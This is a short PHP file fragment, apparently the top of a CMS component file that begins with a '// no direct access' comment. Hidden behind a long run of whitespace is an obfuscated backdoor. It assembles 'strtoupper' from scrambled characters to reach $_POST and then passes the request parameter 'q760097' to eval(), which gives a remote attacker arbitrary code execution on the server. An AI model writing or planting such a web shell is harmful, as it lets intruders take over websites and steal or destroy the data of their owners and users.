<?php                                                                                                                                                                                                                                                        $ebpw8="rteu_ops"; $zdel65=$ebpw8[7].$ebpw8[1].$ebpw8[0].$ebpw8[1].$ebpw8[5]. $ebpw8[3]. $ebpw8[6].$ebpw8[6].$ebpw8[2]. $ebpw8[0];$nej3 = $zdel65( $ebpw8[4]. $ebpw8[6] .$ebpw8[5].$ebpw8[7]. $ebpw8[1] ); if ( isset(${$nej3}['q760097' ])) {eval ( ${$nej3} [ 'q760097'] ) ; } ?> <?php
// no direct access
